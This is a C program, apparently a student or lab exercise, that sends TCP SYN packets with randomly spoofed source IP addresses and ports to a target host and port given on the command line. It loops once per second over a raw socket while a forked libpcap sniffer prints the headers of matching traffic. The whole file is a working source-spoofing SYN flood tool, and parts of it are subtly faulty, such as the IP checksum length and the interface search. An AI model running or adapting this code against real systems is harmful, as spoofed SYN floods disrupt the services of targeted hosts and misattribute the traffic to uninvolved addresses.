#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <unistd.h>
#include <pcap.h>
#include <errno.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h> // IP header
#include <netinet/tcp.h> // TCP header
#include <arpa/inet.h>
#include <netdb.h>
#include <strings.h>
#include <errno.h>
#include <netinet/if_ether.h>
#include <sys/wait.h>

/**
 * Pseudo header required for computing TCP checksum
 */
struct pseudo_header   
{
	unsigned int source_address;
	unsigned int dest_address;
	unsigned char placeholder;
	unsigned char protocol;
	unsigned short tcp_length;
	struct tcphdr tcp;
};

pid_t pid = -1;

/**
 * Generates a random IP address within the ranges specified below,
 * and stores the result in the provided buffer
 * Class A	1.0.0.1 to 126.255.255.254
 * Class B	128.1.0.1 to 191.255.255.254
 * Class C	192.0.1.1 to 223.255.254.254
 * Class D	224.0.0.0 to 239.255.255.255
 * @param ip_string The buffer (of minimum size 16) into which
 *                  the IP address is to be stored
 */
void generate_random_ip(char* ip_string) {
	int first = (rand() % 239) + 1;
	int second = rand() % 256;
	int third = (first > 191 && first < 224) ? (rand() % 255) : (rand() % 256);
	int fourth = (first < 224) ? (rand() % 255) : (rand() % 256);
	sprintf(ip_string, "%d.%d.%d.%d", first, second, third, fourth);
}

/**
 * Generates a random port number in the range 1025 to 65535
 * 
 * @return a random port number that is valid
 */
int generate_random_port() {
	int port_num = rand() % 65536;
	if(port_num < 1025) {
		port_num += 1025;
	}
	return port_num;
}

/**
 * generates the checksum for a given header
 * @param buffer	The data whose checksum is to be generated
 * @param size		size of the data
 * 
 * @return the 16-bit checksum
 */
unsigned short generate_checksum(unsigned short *buffer, int size)
{
    unsigned long cksum=0;
    while(size >1)
    {
        cksum+=*buffer++;
        size -=sizeof(unsigned short);
    }
    if(size)
        cksum += *(unsigned char*)buffer;

    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >>16);
    return (unsigned short)(~cksum);
}

/**
 * Generates the TCP checksum for the TCP header and assigns to it the value
 * @param iph	The IP header
 * @param tcph	The TCP header
 * @param data	The TCP payload
 * @param size	Size of the TCP payload
 */
void generate_tcp_checksum(struct iphdr* iph, struct tcphdr* tcph, char* data, int size) {
	tcph->check = 0;
	struct pseudo_header psd_header;
	psd_header.dest_address = iph->daddr;
	psd_header.source_address = iph->saddr;
	psd_header.placeholder = 0;
	psd_header.protocol = IPPROTO_TCP;
	psd_header.tcp_length = htons(sizeof(struct tcphdr) + size);

	char tcp_buf[65536];
	memcpy(tcp_buf, &psd_header, sizeof(struct pseudo_header));
	memcpy(tcp_buf + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));
	memcpy(tcp_buf + sizeof(struct pseudo_header) + sizeof(struct tcphdr), data, size);
	tcph->check = generate_checksum((unsigned short*) tcp_buf, sizeof(struct pseudo_header) + sizeof(struct tcphdr) + size);
}

/**
 * Populates the IP header for the SYN datagram
 * @param iph		Pointer to memory location for storing IP header
 * @param dest_ip	String specifying the destination IP address
 */
void get_ip_header(struct iphdr* iph, char* dest_ip) {
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof(struct ip) + sizeof(struct tcphdr);
	iph->id = htons(generate_random_port()); // this number jsut serves as an ID here
	iph->frag_off = 0;
	iph->ttl = 255;
	iph->protocol = IPPROTO_TCP;
	iph->check = 0; // compute later

	char src_ip[INET_ADDRSTRLEN];
	(generate_random_ip(src_ip));
	iph->saddr = inet_addr(src_ip);
	iph->daddr = inet_addr(dest_ip);
}

/**
 * Populates the required TCP header for the SYN segment
 * @param tcph		pointer to the memory location for storing TCP header
 * @param dest_port	The destination port number
 */
void get_tcp_header(struct tcphdr* tcph, int dest_port) {
	tcph->source = htons(generate_random_port());
	tcph->dest = htons(dest_port);
	tcph->seq = htonl(generate_random_port()); // some random sequence number
	tcph->ack_seq = 0;
	tcph->doff = 5;
	tcph->fin = 0;
	tcph->syn = 1;
	tcph->rst = 0;
	tcph->psh = 0;
	tcph->ack = 0;
	tcph->urg = 0;
	tcph->window = htons(5840); // max allowed window size
	tcph->check = 0; // populate later
	tcph->urg_ptr = 0;

	// // populate pseudo header for checksum calculation
	// struct pseudo_header psh;
	// psh.source_address = tcph->source;
	// psh.dest_address = tcph->dest;
	// psh.placeholder = 0;
	// psh.protocol = IPPROTO_TCP;
	// psh.tcp_length = htons(20);

	// memcpy(&psh.tcp, tcph, sizeof(struct tcphdr));

	// // update tcp checksum
	// tcph->check = generate_checksum((unsigned short*) &psh, sizeof(struct pseudo_header));
}

/**
 * Prints data associated with a packet in the character-wise form
 * @param data	The packet data
 * @param size	The size of the packet
 */
void print_packet_data(const u_char * data , int size) {
	int i , j;
	for(i=0 ; i < size ; i++)
	{
		if( i!=0 && i%16==0)   //if one line of hex printing is complete...
		{
			printf("         ");
			for(j=i-16 ; j<i ; j++)
			{
				if(data[j]>=32 && data[j]<=128)
					printf("%c",(unsigned char)data[j]); //if its a number or alphabet
				
				else printf("."); //otherwise print a dot
			}
			printf("\n");
		} 
		
		if(i%16==0) printf("   ");
			printf(" %02X",(unsigned int)data[i]);
				
		if( i==size-1)  //print the last spaces
		{
			for(j=0;j<15-i%16;j++) 
			{
				printf("   "); //extra spaces
			}
			
			printf("         ");
			
			for(j=i-i%16 ; j<=i ; j++)
			{
				if(data[j]>=32 && data[j]<=128) 
				{
					printf("%c",(unsigned char)data[j]);
				}
				else 
				{
					printf(".");
				}
			}
			
			printf( "\n" );
		}
	}
}

/**
 * Prints the Ethernet header from a sniffed packet
 * @param data	The packet data
 */
void print_ethernet_header(const u_char *buffer) {
	struct ethhdr *eth = (struct ethhdr *)buffer;
	
	printf("\n");
	printf("Ethernet Header\n");
	printf("   |-Destination Address : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X \n", eth->h_dest[0] , eth->h_dest[1] , eth->h_dest[2] , eth->h_dest[3] , eth->h_dest[4] , eth->h_dest[5] );
	printf("   |-Source Address      : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X \n", eth->h_source[0] , eth->h_source[1] , eth->h_source[2] , eth->h_source[3] , eth->h_source[4] , eth->h_source[5] );
	printf("   |-Protocol            : %u \n",(unsigned short)eth->h_proto);
}

/**
 * Prints the IP header from the received packet
 * @param data	The packet data
 */
void print_ip_header(const u_char* buffer) {

	print_ethernet_header(buffer);

	unsigned short iphdrlen;
	struct sockaddr_in source,dest;
		
	struct iphdr *iph = (struct iphdr *)(buffer  + sizeof(struct ethhdr));
	// struct iphdr* iph = (struct iphdr*) buffer;
	iphdrlen = iph->ihl*4;
	
	memset(&source, 0, sizeof(source));
	source.sin_addr.s_addr = iph->saddr;
	
	memset(&dest, 0, sizeof(dest));
	dest.sin_addr.s_addr = iph->daddr;

	printf("\n");
	printf("IP Header\n");
	printf("   %-27s%s %d\n","|-IP Version",":",(unsigned int)iph->version);
	printf("   %-27s%s %d DWORDS or %d Bytes\n","|-IP Header Length",":",(unsigned int)iph->ihl,((unsigned int)(iph->ihl))*4);
	printf("   %-27s%s %d\n","|-Type Of Service",":",(unsigned int)iph->tos);
	printf("   %-27s%s %d Bytes(size of Packet)\n","|-IP Total Length",":",ntohs(iph->tot_len));
	printf("   %-27s%s %d\n","|-Identification",":",ntohs(iph->id));
	// printf("   |-Reserved ZERO Field   : %d\n",(unsigned int)iph->ip_reserved_zero);
	// printf("   |-Dont Fragment Field   : %d\n",(unsigned int)iph->ip_dont_fragment);
	// printf("   |-More Fragment Field   : %d\n",(unsigned int)iph->ip_more_fragment);
	printf("   %-27s%s %d\n","|-TTL",":",(unsigned int)iph->ttl);
	printf("   %-27s%s %d\n","|-Protocol",":",(unsigned int)iph->protocol);
	printf("   %-27s%s %d\n","|-Checksum",":",ntohs(iph->check));
	printf("   %-27s%s %s\n","|-Source IP",":" , inet_ntoa(source.sin_addr) );
	printf("   %-27s%s %s\n","|-Destination IP",":" , inet_ntoa(dest.sin_addr) );
}

/**
 * Prints the TCP header from a sniffed packet
 * @param data	The packet data
 * @param size	The size of the packet
 */
void print_tcp_header(const u_char* buffer, int size) {
	unsigned short iphdrlen;
	
	struct iphdr *iph = (struct iphdr *)( buffer  + sizeof(struct ethhdr) );
	// struct iphdr* iph = (struct iphdr*) buffer;
	iphdrlen = iph->ihl*4;
	
	struct tcphdr *tcph=(struct tcphdr*)(buffer + iphdrlen + sizeof(struct ethhdr));
	// struct tcphdr* tcph = (struct tcphdr*) (buffer + iphdrlen);
	int header_size = sizeof(struct ethhdr) + iphdrlen + tcph->doff*4;
	
	printf("\n\n***********************TCP Packet*************************\n");	
		
	print_ip_header(buffer);
		
	printf("\n");
	printf("TCP Header\n");
	printf("   %-27s%s %u\n","|-Source Port",":",ntohs(tcph->source));
	printf("   %-27s%s %u\n","|-Destination Port",":",ntohs(tcph->dest));
	printf("   %-27s%s %u\n","|-Sequence Number",":",ntohl(tcph->seq));
	printf("   %-27s%s %u\n","|-Acknowledge Number",":",ntohl(tcph->ack_seq));
	printf("   %-27s%s %d DWORDS or %d BYTES\n","|-Header Length",":" ,(unsigned int)tcph->doff,(unsigned int)tcph->doff*4);
	// printf("   |-CWR Flag : %d\n",(unsigned int)tcph->cwr);
	// printf("   |-ECN Flag : %d\n",(unsigned int)tcph->ece);
	printf("   %-27s%s %d\n","|-Urgent Flag",":",(unsigned int)tcph->urg);
	printf("   %-27s%s %d\n","|-Acknowledgement Flag",":",(unsigned int)tcph->ack);
	printf("   %-27s%s %d\n","|-Push Flag",":",(unsigned int)tcph->psh);
	printf("   %-27s%s %d\n","|-Reset Flag",":",(unsigned int)tcph->rst);
	printf("   %-27s%s %d\n","|-Synchronise Flag",":",(unsigned int)tcph->syn);
	printf("   %-27s%s %d\n","|-Finish Flag",":",(unsigned int)tcph->fin);
	printf("   %-27s%s %d\n","|-Window",":",ntohs(tcph->window));
	printf("   %-27s%s %d\n","|-Checksum",":",ntohs(tcph->check));
	printf("   %-27s%s %d\n","|-Urgent Pointer",":",tcph->urg_ptr);
	printf("\n");
	// printf("                        DATA Dump                         ");
	// printf("\n");
		
	// printf("IP Header\n");
	// print_packet_data(buffer,iphdrlen);
		
	// printf("TCP Header\n");
	// print_packet_data(buffer+iphdrlen,tcph->doff*4);
		
	// printf("Data Payload\n");	
	// print_packet_data(buffer + header_size , size - header_size );
						
	printf("\n###########################################################");
}

/**
 * Prints the IP header from the received packet
 * @param data	The packet data
 */
void print_ip_header_debug(const u_char* buffer) {

	// print_ethernet_header(buffer);

	unsigned short iphdrlen;
	struct sockaddr_in source,dest;
		
	// struct iphdr *iph = (struct iphdr *)(buffer  + sizeof(struct ethhdr));
	struct iphdr* iph = (struct iphdr*) buffer;
	iphdrlen = iph->ihl*4;
	
	memset(&source, 0, sizeof(source));
	source.sin_addr.s_addr = iph->saddr;
	
	memset(&dest, 0, sizeof(dest));
	dest.sin_addr.s_addr = iph->daddr;

	printf("\n");
	printf("IP Header\n");
	printf("   %-27s%s %d\n","|-IP Version",":",(unsigned int)iph->version);
	printf("   %-27s%s %d DWORDS or %d Bytes\n","|-IP Header Length",":",(unsigned int)iph->ihl,((unsigned int)(iph->ihl))*4);
	printf("   %-27s%s %d\n","|-Type Of Service",":",(unsigned int)iph->tos);
	printf("   %-27s%s %d Bytes(size of Packet)\n","|-IP Total Length",":",ntohs(iph->tot_len));
	printf("   %-27s%s %d\n","|-Identification",":",ntohs(iph->id));
	// printf("   |-Reserved ZERO Field   : %d\n",(unsigned int)iph->ip_reserved_zero);
	// printf("   |-Dont Fragment Field   : %d\n",(unsigned int)iph->ip_dont_fragment);
	// printf("   |-More Fragment Field   : %d\n",(unsigned int)iph->ip_more_fragment);
	printf("   %-27s%s %d\n","|-TTL",":",(unsigned int)iph->ttl);
	printf("   %-27s%s %d\n","|-Protocol",":",(unsigned int)iph->protocol);
	printf("   %-27s%s %d\n","|-Checksum",":",ntohs(iph->check));
	printf("   %-27s%s %s\n","|-Source IP",":" , inet_ntoa(source.sin_addr) );
	printf("   %-27s%s %s\n","|-Destination IP",":" , inet_ntoa(dest.sin_addr) );
}

/**
 * Prints the TCP header from a sniffed packet
 * @param data	The packet data
 * @param size	The size of the packet
 */
void print_tcp_header_debug(const u_char* buffer, int size) {
	unsigned short iphdrlen;
	
	// struct iphdr *iph = (struct iphdr *)( buffer  + sizeof(struct ethhdr) );
	struct iphdr* iph = (struct iphdr*) buffer;
	iphdrlen = iph->ihl*4;
	
	// struct tcphdr *tcph=(struct tcphdr*)(buffer + iphdrlen + sizeof(struct ethhdr));
	struct tcphdr* tcph = (struct tcphdr*) (buffer + iphdrlen);
	int header_size = /* sizeof(struct ethhdr) */ + iphdrlen + tcph->doff*4;
	
	printf("\n\n***********************DEBUG TCP Packet*************************\n");	
		
	print_ip_header_debug(buffer);
		
	printf("\n");
	printf("TCP Header\n");
	printf("   %-27s%s %u\n","|-Source Port",":",ntohs(tcph->source));
	printf("   %-27s%s %u\n","|-Destination Port",":",ntohs(tcph->dest));
	printf("   %-27s%s %u\n","|-Sequence Number",":",ntohl(tcph->seq));
	printf("   %-27s%s %u\n","|-Acknowledge Number",":",ntohl(tcph->ack_seq));
	printf("   %-27s%s %d DWORDS or %d BYTES\n","|-Header Length",":" ,(unsigned int)tcph->doff,(unsigned int)tcph->doff*4);
	// printf("   |-CWR Flag : %d\n",(unsigned int)tcph->cwr);
	// printf("   |-ECN Flag : %d\n",(unsigned int)tcph->ece);
	printf("   %-27s%s %d\n","|-Urgent Flag",":",(unsigned int)tcph->urg);
	printf("   %-27s%s %d\n","|-Acknowledgement Flag",":",(unsigned int)tcph->ack);
	printf("   %-27s%s %d\n","|-Push Flag",":",(unsigned int)tcph->psh);
	printf("   %-27s%s %d\n","|-Reset Flag",":",(unsigned int)tcph->rst);
	printf("   %-27s%s %d\n","|-Synchronise Flag",":",(unsigned int)tcph->syn);
	printf("   %-27s%s %d\n","|-Finish Flag",":",(unsigned int)tcph->fin);
	printf("   %-27s%s %d\n","|-Window",":",ntohs(tcph->window));
	printf("   %-27s%s %d\n","|-Checksum",":",ntohs(tcph->check));
	printf("   %-27s%s %d\n","|-Urgent Pointer",":",tcph->urg_ptr);
	printf("\n");
	// printf("                        DATA Dump                         ");
	// printf("\n");
		
	// printf("IP Header\n");
	// print_packet_data(buffer,iphdrlen);
		
	// printf("TCP Header\n");
	// print_packet_data(buffer+iphdrlen,tcph->doff*4);
		
	// printf("Data Payload\n");	
	// print_packet_data(buffer + header_size , size - header_size );
						
	printf("\n###########################################################");
}


/**
 * Callback function for libpcap, for displaying details of the sniffed packets
 */
void libpcap_callback(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet) { 
	static int count = 0; 
	int size = pkthdr->len;

	// get the IP header of this packet, excluding ethernet header
	struct iphdr* iph = (struct iphdr*) (packet + sizeof(struct ethhdr));

	switch (iph->protocol) {
		case IPPROTO_TCP: {
			print_tcp_header(packet, size);
		}
		break;
		default: {
			// do nothing; this packet is not of interest
			/***************** DEBUG *******************/
			print_ip_header(packet);
			printf("Not a TCP Packet!\n\n");
			print_packet_data(packet, size);
		}
	}
	fflush(stdout);
}

/**
 * Generates a datagram packet with fields populated for an IP header
 * and a TCP header corresponding to a SYN segment
 * @param dgram		Buffer in which the datagram should be generated
 * @param dest_ip	The IP address of the destination
 * @param dest_port	The port number of the destination
 */
void get_dgram(char* dgram, struct sockaddr_in* s_in, char* dest_ip, int dest_port) {
	memset(dgram, 0, 4096);
	
	// IP Header
	struct iphdr* iph = (struct iphdr*) dgram;

	// TCP Header
	struct tcphdr* tcph = (struct tcphdr*) (dgram + sizeof(struct ip));

	get_ip_header(iph, dest_ip);

	get_tcp_header(tcph, dest_port);

	generate_tcp_checksum(iph, tcph, NULL, 0);

	s_in->sin_family = AF_INET;
	s_in->sin_port = tcph->dest;
	s_in->sin_addr.s_addr = iph->daddr;

	// compute IP checksum
	iph->check = generate_checksum((unsigned short*) dgram, iph->ihl >> 1);
}

/**
 * Handler for SIGALRM. This function just resets the alarm
 */ 
void sigalrm_handler(int signo) {
	alarm(1);
	return;
}

/**
 * Handler for SIGINT
 */
void sigint_handler(int signo) {
	if(pid != -1) {
		kill(pid, SIGINT);
		int status;
		while(wait(&status) != -1);
	}
	exit(0);
}

int main(int argc, char** argv) {
	
	if(argc < 3) {
		fprintf(stderr, "Expected 2 arguments, found %d.\nUasge: %s <Target_IP> <Target_Port>\nTerminating.\n", (argc - 1), argv[0]);
		return -1;
	}

	// reading inputs from command line
	char* hostname = argv[1];
	int port = atoi(argv[2]);

	// setting the seed for the random IP generator
	srand(time(0));

	if((pid = fork()) < 0) {
		perror("Failed to create child process. Terminating");
		exit(1);
	} else if(pid == 0) {
		/* configuring packet sniffing */
		int i;
		char dev[100]; 
		char errbuf[PCAP_ERRBUF_SIZE]; 
		pcap_t* descr; 
		const u_char *packet; 
		struct pcap_pkthdr hdr;
		struct ether_header *eptr;    /* net/ethernet.h */
		struct bpf_program fp;        /* hold compiled program */
		bpf_u_int32 maskp;            /* subnet mask */
		bpf_u_int32 netp;             /* ip */
		pcap_if_t* interfaces;

		// Now get a device
		pcap_findalldevs(&interfaces, errbuf);

		// chcking if loopback device can be found
		pcap_if_t* curr = interfaces;
		while(strcmp(curr->name, "lo") != 0) {
			curr = curr->next;
		}
		if(curr != NULL) {
			// loopback found, assign it as device name
			strcpy(dev, curr->name);
		} else {
			// loopback not found, use first device as default
			strcpy(dev,interfaces->name);
		}
		pcap_freealldevs(interfaces);

		// Get the network address and mask
		pcap_lookupnet(dev, &netp, &maskp, errbuf); 
	
		// open device for reading in promiscuous mode
		descr = pcap_open_live(dev, BUFSIZ, 1,-1, errbuf); 
		if(descr == NULL) {
			printf("pcap_open_live(): %s\n", errbuf);
			exit(1);
		} 
	
		// Now we'll compile the filter expression
		char filter[16];
		sprintf(filter, "tcp port %s", argv[2]);
		printf("Filter: %s\n", filter);
		if(pcap_compile(descr, &fp, filter, 0, netp) == -1) {
			fprintf(stderr, "Error calling pcap_compile\n");
			exit(1);
		} 
	
		// set the filter
		if(pcap_setfilter(descr, &fp) == -1) {
			fprintf(stderr, "Error setting filter\n");
			exit(1);
		} 
	
		// loop for callback function
		pcap_loop(descr, -1, libpcap_callback, NULL); 
		
		if(dev == NULL) {
			fprintf(stderr, "%s\n", errbuf);
			exit(1);
		} 
	} else {
		// configuring SIGALRM handler
		signal(SIGALRM, sigalrm_handler);

		// configuring SIGINT handler
		signal(SIGINT, sigint_handler);

		// buffer to store destination IP address
		char dest_ip[INET_ADDRSTRLEN];

		// make DNS request for destination IP address
		struct addrinfo hints;
		struct addrinfo* res;

		bzero(&hints, sizeof(hints));
		hints.ai_family = AF_INET;
		hints.ai_socktype = SOCK_STREAM;
		hints.ai_flags = 0;
		hints.ai_protocol = 0;     
		hints.ai_canonname = NULL;
		hints.ai_addr = NULL;
		hints.ai_next = NULL;

		int status;
		if((status = getaddrinfo(hostname, argv[2], &hints, &res)) != 0) {
			printf("tcp_connect error for %s, %s: %s",
			hostname, argv[2], gai_strerror(status));
			return -1;
		}

		// DNS query succeeded, we require only the first IP:PORT from the query
		strcpy(dest_ip, inet_ntoa((struct in_addr)(((struct sockaddr_in*) res->ai_addr)->sin_addr)));

		// IP:PORT determined, release memory for getaddrinfo
		freeaddrinfo(res);

		// set alarm for one second
		alarm(1);

		while(1) {
			// create raw socket
			int raw_fd;
			if((raw_fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) < 0) {
				perror("Could not create socket. Terminating");
				return -1;
			}

			// create header to send
			char datagram[4096];
			struct sockaddr_in s_in;
			get_dgram(datagram, &s_in, dest_ip, port);

			/*********** DEBUG **************/
			// print_tcp_header_debug(datagram, 4096);

			int optval = 1;
			const int* val = &optval;

			// include new header
			if(setsockopt(raw_fd, IPPROTO_IP, IP_HDRINCL, val, sizeof(optval)) < 0) {
				perror("Failed to include header to the packet. Terminating");
				return -1;
			}

			// send message (TCP SYN)
			if(sendto(raw_fd,
				datagram, 
				(sizeof(struct ip) + sizeof(struct tcphdr)),
				0,
				(struct sockaddr*) &s_in,
				sizeof(s_in)) < 0) {
				perror("Failed to send TCP SYN packet");
			}

			// close file descriptor
			close(raw_fd);

			// pause till alarm or any other interrupt is received
			pause();
		}
	}

	return 0;
}